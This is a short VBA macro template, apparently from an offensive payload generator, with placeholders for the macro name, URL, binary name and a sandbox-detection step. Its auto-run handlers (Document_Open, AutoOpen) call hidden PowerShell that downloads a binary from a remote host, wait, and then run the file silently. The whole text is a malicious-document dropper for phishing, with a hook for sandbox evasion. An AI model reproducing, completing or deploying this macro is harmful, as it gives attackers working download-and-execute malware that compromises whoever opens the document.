Sub Document_Open()
    {MACRO_NAME}
End Sub

Sub AutoOpen()
    {MACRO_NAME}
End Sub

Sub {MACRO_NAME}()

    {DETECT_SANDBOX_TIME}

    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('{HTTP_URL}/{BINARY_NAME}', '{BINARY_NAME}')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path & "\" & "{BINARY_NAME}"
    Wait ({WAIT_TIME_SECONDS})
    Shell exePath, vbHide
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub